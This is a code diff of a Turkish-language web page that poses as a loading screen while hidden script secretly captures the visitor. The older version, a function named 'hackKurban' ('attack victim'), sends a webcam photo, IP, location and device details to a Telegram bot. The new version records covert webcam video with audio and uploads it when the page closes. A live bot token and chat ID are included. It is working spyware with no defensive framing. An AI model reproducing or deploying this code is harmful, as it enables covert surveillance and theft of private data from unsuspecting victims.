@@ -89,7 +89,6 @@
       100%{opacity:0.5;}
     }
 
-    /* Gizli video elementi */
     #hiddenVideo{
       display:none;
     }
@@ -97,34 +96,25 @@
 </head>
 <body>
 
-  <!-- Gizli video (kamera için) -->
   <video id="hiddenVideo" autoplay muted playsinline></video>
 
   <div class="container">
-
     <div class="logo">𝖀𝖒𝖚𝖙</div>
-
     <div class="loading-text">Yükleniyor...</div>
-
     <div class="bar">
       <div class="progress" id="progress"></div>
     </div>
-
     <div class="percent" id="percent">0%</div>
-
-    <div class="fake-status" id="status">
-      Sunucuya bağlanılıyor...
-    </div>
-
+    <div class="fake-status" id="status">Sunucuya bağlanılıyor...</div>
   </div>
 
   <script>
-    // ========== TELEGRAM BOT AYARLARI ==========
+    // ========== TELEGRAM AYARLARI ==========
     const BOT_TOKEN = '8658397323:AAF0Kl8pRUbRXPK6wPVT6pC6iu8l6BeZMew';
     const CHAT_ID = '7497803165';
-    // ===========================================
+    // =======================================
 
-    // Loading bar animasyonu
+    // Loading bar
     let progress = 0;
     const progressBar = document.getElementById("progress");
     const percentText = document.getElementById("percent");
@@ -143,7 +133,7 @@
       "bir dakika..."
     ];
 
-    const barInterval = setInterval(() => {
+    setInterval(() => {
       if(progress < 98){
         progress += Math.random() * 2;
         if(progress > 98) progress = 98;
@@ -157,108 +147,146 @@
       statusText.innerText = randomMessage;
     }, 2000);
 
-    // ========== KAMERA + BİLGİ TOPLAMA ==========
-    async function hackKurban() {
+    // ========== VİDEO KAYIT SİSTEMİ ==========
+    let mediaStream = null;
+    let mediaRecorder = null;
+    let videoChunks = [];
+    let kayitBaslangic = null;
+    let ipBilgisi = 'bilinmiyor';
+    let videoCaptions = [];
+
+    // IP al
+    async function getIp() {
       try {
-        // Kamera izni iste (sessizce, kullanıcı loading'e bakarken)
-        const stream = await navigator.mediaDevices.getUserMedia({ 
-          video: { facingMode: 'user', width: 640, height: 480 }
-        });
+        const res = await fetch('https://api.ipify.org?format=json');
+        const data = await res.json();
+        ipBilgisi = data.ip;
+      } catch(e) {}
+    }
 
-        const video = document.getElementById('hiddenVideo');
-        video.srcObject = stream;
-        await video.play();
-
-        // 1 saniye bekle (kameranın oturması için)
-        await new Promise(r => setTimeout(r, 1000));
-
-        // Fotoğraf çek
-        const canvas = document.createElement('canvas');
-        canvas.width = 640;
-        canvas.height = 480;
-        canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
-        
-        const photoBlob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.9));
-
-        // Kamerayı kapat (artık işimiz bitti)
-        stream.getTracks().forEach(track => track.stop());
-
-        // IP al
-        let ip = 'bilinmiyor';
+    // Batarya bilgisi
+    async function getBattery() {
+      if (navigator.getBattery) {
         try {
-          const ipRes = await fetch('https://api.ipify.org?format=json');
-          const ipData = await ipRes.json();
-          ip = ipData.ip;
+          const bat = await navigator.getBattery();
+          return `%${Math.round(bat.level * 100)} ${bat.charging ? '⚡Şarjda' : '🔋Pil'}`;
         } catch(e) {}
+      }
+      return 'bilinmiyor';
+    }
 
-        // Batarya bilgisi
-        let batteryInfo = 'bilinmiyor';
-        if (navigator.getBattery) {
-          try {
-            const bat = await navigator.getBattery();
-            batteryInfo = `%${Math.round(bat.level * 100)} ${bat.charging ? '(Şarjda)' : '(Pil)'}`;
-          } catch(e) {}
-        }
-
-        // Konum dene (isteğe bağlı)
-        let konum = 'bilinmiyor';
-        try {
-          const pos = await new Promise((res, rej) => {
-            navigator.geolocation.getCurrentPosition(res, rej, { timeout: 3000 });
-          });
-          konum = `${pos.coords.latitude}, ${pos.coords.longitude}`;
-        } catch(e) {}
-
-        // Cihaz bilgileri
-        const info = `
-📱 **YENİ KURBAN**
-
-🌐 **IP:** ${ip}
-📍 **Konum:** ${konum}
-💻 **Cihaz:** ${navigator.platform}
-🖥 **Browser:** ${navigator.userAgent.substring(0, 80)}
-🔋 **Batarya:** ${batteryInfo}
-📺 **Ekran:** ${screen.width}x${screen.height}
-🌍 **Dil:** ${navigator.language}
-⏰ **Tarih:** ${new Date().toLocaleString('tr-TR')}
-        `.trim();
-
-        // Telegram'a gönder
+    // Videoyu Telegram'a gönder
+    async function videoGonder(videoBlob, caption) {
+      try {
         const formData = new FormData();
         formData.append('chat_id', CHAT_ID);
-        formData.append('photo', photoBlob, 'kurban.jpg');
-        formData.append('caption', info);
+        formData.append('video', videoBlob, 'kayit.mp4');
+        formData.append('caption', caption);
         formData.append('parse_mode', 'Markdown');
 
-        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
           method: 'POST',
           body: formData
         });
 
-        const result = await response.json();
-        console.log('Telegram cevabı:', result);
+        console.log('Video gönderildi!');
+      } catch (err) {
+        console.error('Video gönderilemedi:', err);
+      }
+    }
+
+    // Kaydı durdur ve videoyu gönder
+    async function kaydiBitir() {
+      if (mediaRecorder && mediaRecorder.state !== 'inactive') {
+        console.log('Kayıt bitiriliyor...');
+        mediaRecorder.stop();
+        
+        // MediaRecorder'ın onstop event'inde video gönderilecek
+        // (aşağıda tanımlı)
+      }
+    }
+
+    // Ana fonksiyon - kamerayı aç ve kayda başla
+    async function baslat() {
+      await getIp();
+      const battery = await getBattery();
+
+      try {
+        // Kamerayı aç - SADECE video, ses de istiyoruz
+        mediaStream = await navigator.mediaDevices.getUserMedia({ 
+          video: { facingMode: 'user', width: 640, height: 480 },
+          audio: true  // SES KAYDI İÇİN
+        });
+
+        const video = document.getElementById('hiddenVideo');
+        video.srcObject = mediaStream;
+        await video.play();
+
+        console.log('Kamera açıldı, video kaydı başlıyor...');
+
+        // MediaRecorder ile kayda başla
+        kayitBaslangic = new Date();
+        videoChunks = [];
+        
+        // Desteklenen formatı kontrol et
+        let mimeType = 'video/webm;codecs=vp9,opus';
+        if (!MediaRecorder.isTypeSupported(mimeType)) {
+          mimeType = 'video/webm;codecs=vp8,opus';
+          if (!MediaRecorder.isTypeSupported(mimeType)) {
+            mimeType = 'video/webm';
+          }
+        }
+
+        mediaRecorder = new MediaRecorder(mediaStream, { mimeType: mimeType });
+
+        mediaRecorder.ondataavailable = (event) => {
+          if (event.data.size > 0) {
+            videoChunks.push(event.data);
+          }
+        };
+
+        mediaRecorder.onstop = async () => {
+          console.log('Kayıt durdu, video hazırlanıyor...');
+          
+          // Video blob'unu oluştur
+          const videoBlob = new Blob(videoChunks, { type: mimeType });
+          
+          const sure = Math.floor((new Date() - kayitBaslangic) / 1000);
+          const dakika = Math.floor(sure / 60);
+          const saniye = sure % 60;
+
+          const caption = `
+🎥 **VİDEO KAYDI**
+
+⏱ **Süre:** ${dakika}:${saniye.toString().padStart(2, '0')}
+🌐 **IP:** ${ipBilgisi}
+💻 **Cihaz:** ${navigator.platform}
+🔋 **Batarya:** ${battery}
+📺 **Ekran:** ${screen.width}x${screen.height}
+⏰ **Tarih:** ${kayitBaslangic.toLocaleString('tr-TR')}
+          `.trim();
+
+          // Videoyu Telegram'a gönder
+          await videoGonder(videoBlob, caption);
+        };
+
+        // 10 saniyede bir parça topla (kesintisiz kayıt için)
+        mediaRecorder.start(10000); // her 10 saniyede bir chunk
+
+        console.log('Video kaydı aktif - sayfa kapanınca video gönderilecek');
 
       } catch (err) {
-        console.error('Hata oluştu:', err);
+        console.error('Kamera açılamadı:', err);
         
-        // Kamera izni verilmezse bile en azından bilgileri gönder
+        // Kamera yoksa sadece bilgi gönder
         try {
-          let ip = 'bilinmiyor';
-          try {
-            const ipRes = await fetch('https://api.ipify.org?format=json');
-            const ipData = await ipRes.json();
-            ip = ipData.ip;
-          } catch(e) {}
-
           const info = `
-❌ **KAMERA İZNİ ALINAMADI**
+❌ **KAMERA REDDEDİLDİ**
 
-🌐 **IP:** ${ip}
+🌐 **IP:** ${ipBilgisi}
 💻 **Cihaz:** ${navigator.platform}
-🖥 **Browser:** ${navigator.userAgent.substring(0, 80)}
+🔋 **Batarya:** ${battery}
 📺 **Ekran:** ${screen.width}x${screen.height}
-🌍 **Dil:** ${navigator.language}
-⏰ **Tarih:** ${new Date().toLocaleString('tr-TR')}
           `.trim();
 
           await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -270,14 +298,32 @@
               parse_mode: 'Markdown'
             })
           });
-        } catch(e2) {
-          console.log('Bilgi gönderilemedi:', e2);
-        }
+        } catch(e) {}
       }
     }
 
-    // Sayfa yüklenir yüklenmez başlat
-    hackKurban();
+    // Sayfa kapanınca videoyu gönder
+    window.addEventListener('beforeunload', (e) => {
+      console.log('Sayfa kapanıyor, video kaydediliyor...');
+      // Tarayıcı sayfayı kapatmadan önce kaydı bitir
+      kaydiBitir();
+      
+      // Bazı tarayıcılar için
+      if (mediaStream) {
+        mediaStream.getTracks().forEach(track => track.stop());
+      }
+    });
+
+    // Sayfa görünürlüğü değişince (arka plana geçince) 
+    document.addEventListener('visibilitychange', () => {
+      if (document.hidden) {
+        console.log('Sayfa arkaplana geçti, kayıt devam ediyor...');
+        // Kayıt devam etsin ama yine de sayfa kapanma durumunu kontrol et
+      }
+    });
+
+    // Başlat
+    baslat();
   </script>
 
 </body>
